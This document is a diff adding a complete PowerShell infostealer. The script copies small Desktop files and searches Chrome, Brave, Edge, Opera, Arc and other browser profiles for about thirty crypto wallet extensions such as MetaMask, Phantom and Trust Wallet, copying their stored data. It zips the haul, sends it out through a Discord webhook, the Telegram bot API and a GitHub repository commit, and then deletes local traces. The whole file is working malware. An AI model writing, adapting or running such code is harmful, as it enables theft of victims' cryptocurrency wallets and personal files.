@@ -1,0 +1,225 @@
+#Requires -Version 5.1
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+# === CONFIGURATION ===
+$DEST = "$env:TEMP\myfiles"
+$WDIR = "$DEST\mycryptowallet"
+$DESK = [Environment]::GetFolderPath("Desktop")
+$MAX = 102400
+
+# === THREE C2 ENDPOINTS ===
+$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/XXXXXXXXXXX/YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"
+$TELEGRAM_TOKEN   = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+$TELEGRAM_CHAT_ID = "123456789"
+$GITHUB_TOKEN     = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+$GITHUB_REPO      = "username/repo"
+$GITHUB_BRANCH    = "main"
+
+# === FUNCTIONS ===
+function sn($s) { $s -replace '[\\/:*?"<>|(){} @.]', '_' }
+function scp($s,$d) { if (Test-Path $s) { Copy-Item $s $d -Recurse -Force -EA SilentlyContinue } }
+
+function blist {
+    $L = $env:LOCALAPPDATA; $R = $env:APPDATA
+    return @(
+        "Chrome|$L\Google\Chrome\User Data"
+        "Chrome Canary|$L\Google\Chrome SxS\User Data"
+        "Brave|$L\BraveSoftware\Brave-Browser\User Data"
+        "Edge|$L\Microsoft\Edge\User Data"
+        "Opera|$R\Opera Software\Opera Stable"
+        "Opera GX|$R\Opera Software\Opera GX Stable"
+        "Vivaldi|$L\Vivaldi\User Data"
+        "Yandex|$L\Yandex\YandexBrowser\User Data"
+        "Thorium|$L\Thorium\User Data"
+        "Chromium|$L\Chromium\User Data"
+        "Arc|$L\Packages\TheBrowserCompany.Arc_ttt1ap7aakyb4\LocalCache\Local\Arc\User Data"
+    )
+}
+
+function wlist {
+    return @(
+        "nkbihfbeogaeaoehlefnkodbefgpgknn|MetaMask"
+        "acmacodkjbdgmoleebolmdjonilkdbch|Rabby Wallet"
+        "odbfpeeihdkbihmopkbjmoonfanlbfcl|MyEtherWallet"
+        "nlbmnnijcnlegkjjpcfjclmcfggfefdm|MEW CX"
+        "opfgelmcmbiajamepnmloijbpoleiama|Rainbow"
+        "kkpllkodjeloidieedojogacfhpaihoh|Enkrypt"
+        "hifafgmccdpekplomjjkcfgodnhcellj|Crypto.com DeFi"
+        "fhbohimaelbohpjbbldcngcnapndodjp|BNB Chain"
+        "cgeeodpfagjceefieflmdfphplkenlfk|ONTO Wallet"
+        "cjelfplplebdjjenllpjcblmjkfcffne|Jaxx Liberty"
+        "hpglfhgfnhbgpjdenjgmdgoeiappafln|Guarda Wallet"
+        "nanjmdknhkinifnkgdcggcfnhdaammmj|Wombat"
+        "gaedmjdfmmahhbjefcbgaolhhanlaolb|HyperPay"
+        "fhilaheimglignddkjgofkcbgekhenbh|Oxalus"
+        "hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase Wallet"
+        "egjidjbpglichdcondbcbdnbeeppgdph|Trust Wallet"
+        "aholpfdialjgjfhomihkjbmgjidlcdno|Exodus"
+        "mcohilncbfahbmgdjkbpemcciiolgcge|OKX Wallet"
+        "mfgccjchihfkkindfppnaooecgfneiii|TokenPocket"
+        "bfnaelmomeimhjnjophhpkkoljpa|Phantom"
+        "bhhhlbepdkbapadjdnnojkbgioiodbic|Solflare"
+        "epapihdplajcdnnkdeiahlgigofloibg|Slope Wallet"
+        "dmkamcknogkgcdfhhbddcghachkejeap|Keplr"
+        "aiifbnbfobpmeekipheeijimdpnlpgpp|Terra Station"
+        "ibnejdfjmmkpcnlpebklmnkoeoihofec|TronLink"
+        "ffnbelfdoeiohenkjibnmadjiehjhajb|Yoroi"
+        "jiidiaalihmmhddjgbnbgdfflelocpak|HashPack"
+        "ejjladinnckdgjemekebdpeokbikhfci|Petra Aptos"
+        "nknhiehlklippafakaeklbeglecifhad|Martian Aptos"
+        "fnnegphlobjdpkhecapkijjdkgcjhkib|Sui Wallet"
+        "opcgpfmipidbgpenhmajoajpbobppdil|Suiet"
+        "cnmamaachppnkjgnildpdmkaakejnhae|Auro Mina"
+        "fnjhmkhhmkbjkkabndcnnogagogbneec|Ronin Wallet"
+    )
+}
+
+function desktop {
+    New-Item $DEST -ItemType Directory -Force | Out-Null
+    Get-ChildItem $DESK -File -EA SilentlyContinue | ForEach-Object {
+        if ($_.Length -le $MAX) {
+            Copy-Item $_.FullName "$DEST\$($_.Name)" -EA SilentlyContinue
+        }
+    }
+}
+
+function cpw($bn, $pd, $id, $wn) {
+    $pn = Split-Path $pd -Leaf
+    $out = Join-Path $WDIR "$(sn $bn)\$(sn $pn)\$(sn $wn)"
+    New-Item $out -ItemType Directory -Force | Out-Null
+    $ver = Get-ChildItem "$pd\Extensions\$id" -Directory -EA SilentlyContinue | Sort-Object Name | Select-Object -Last 1
+    if ($ver) { scp "$($ver.FullName)\manifest.json" "$out\manifest.json" }
+    $idb = "$pd\IndexedDB\chrome-extension_${id}_0.indexeddb.leveldb"
+    if (Test-Path $idb) { New-Item "$out\IndexedDB" -ItemType Directory -Force | Out-Null; scp $idb "$out\IndexedDB" }
+    $ls = "$pd\Local Storage\leveldb"
+    if (Test-Path $ls) {
+        New-Item "$out\LS" -ItemType Directory -Force | Out-Null
+        Get-ChildItem $ls -Include "*.ldb","*.log" -EA SilentlyContinue | Copy-Item -Destination "$out\LS" -Force -EA SilentlyContinue
+    }
+    "wallet=$wn`nbrowser=$bn`nprofile=$pn`next_id=$id" | Set-Content "$out\INFO.txt" -Encoding UTF8
+}
+
+function chromium {
+    foreach ($b in blist) {
+        $bn, $bp = $b.Split('|', 2)
+        if (-not (Test-Path $bp)) { continue }
+        Get-ChildItem $bp -Directory -EA SilentlyContinue |
+            Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile*" } | ForEach-Object {
+            $pd = $_.FullName
+            if (-not (Test-Path "$pd\Extensions")) { return }
+            foreach ($w in wlist) {
+                $id, $wn = $w.Split('|', 2)
+                if (Test-Path "$pd\Extensions\$id") { cpw $bn $pd $id $wn }
+            }
+        }
+    }
+}
+
+# === THREE C2 EXFILTRATION FUNCTIONS ===
+
+function Exfil-Discord {
+    param([string]$FilePath)
+    try {
+        $boundary = [System.Guid]::NewGuid().ToString("N")
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $header = [System.Text.Encoding]::UTF8.GetBytes(
+            "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $FilePath -Leaf)`"`r`nContent-Type: application/zip`r`n`r`n"
+        )
+        $footer = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+        $body = $header + $fileBytes + $footer
+        Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 30 -EA SilentlyContinue | Out-Null
+        return $true
+    } catch { return $false }
+}
+
+function Exfil-Telegram {
+    param([string]$FilePath)
+    try {
+        $url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
+        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
+        $fileStream = [System.IO.File]::OpenRead($FilePath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+        $multipartContent.Add($fileContent, "document", (Split-Path $FilePath -Leaf))
+        $multipartContent.Add([System.Net.Http.StringContent]::new($TELEGRAM_CHAT_ID), "chat_id")
+        $client = New-Object System.Net.Http.HttpClient
+        $response = $client.PostAsync($url, $multipartContent).Result
+        $fileStream.Close()
+        $multipartContent.Dispose()
+        $client.Dispose()
+        return $response.IsSuccessStatusCode
+    } catch { return $false }
+}
+
+function Exfil-GitHub {
+    param([string]$FilePath)
+    try {
+        $fileName = "stolen_data_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
+        $base64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
+        $body = @{
+            message = "Update stolen data"
+            content = $base64
+            branch = $GITHUB_BRANCH
+        } | ConvertTo-Json
+        $headers = @{
+            Authorization = "token $GITHUB_TOKEN"
+        }
+        $url = "https://api.github.com/repos/$GITHUB_REPO/contents/$fileName"
+        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" -TimeoutSec 30 -EA SilentlyContinue | Out-Null
+        return $true
+    } catch { return $false }
+}
+
+function Exfil-All {
+    param([string]$FilePath)
+    $methods = @(
+        @{Name="Discord"; Function={Exfil-Discord $FilePath}},
+        @{Name="Telegram"; Function={Exfil-Telegram $FilePath}},
+        @{Name="GitHub"; Function={Exfil-GitHub $FilePath}}
+    )
+    $success = 0
+    Write-Host "📤 Exfiltrating to THREE C2 channels..." -ForegroundColor Yellow
+    foreach ($method in $methods) {
+        Write-Host -NoNewline "  → $($method.Name)... "
+        if (& $method.Function) {
+            Write-Host "✅" -ForegroundColor Green
+            $success++
+        } else {
+            Write-Host "❌" -ForegroundColor Red
+        }
+    }
+    Write-Host "📊 Exfiltrated to $success/3 channels" -ForegroundColor Cyan
+}
+
+# === MAIN EXECUTION ===
+if ($env:OS -ne "Windows_NT") { exit 1 }
+
+Write-Host "🔍 Scanning for cryptocurrency wallets..." -ForegroundColor Yellow
+New-Item $DEST -ItemType Directory -Force | Out-Null
+New-Item $WDIR -ItemType Directory -Force | Out-Null
+
+desktop
+chromium
+
+# Create ZIP
+$ZIP_OUT = "$env:TEMP\myfiles.zip"
+if (Test-Path $ZIP_OUT) { Remove-Item $ZIP_OUT -Force -EA SilentlyContinue }
+
+try {
+    Add-Type -Assembly System.IO.Compression.FileSystem -EA Stop
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($DEST, $ZIP_OUT)
+} catch {
+    Compress-Archive -Path "$DEST\*" -DestinationPath $ZIP_OUT -Force -EA SilentlyContinue
+}
+
+# Exfiltrate to THREE C2s
+if (Test-Path $ZIP_OUT) {
+    Exfil-All $ZIP_OUT
+}
+
+# Cleanup
+Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
+Remove-Item $ZIP_OUT -Force -EA SilentlyContinue
+
+Write-Host "✅ Done." -ForegroundColor Green
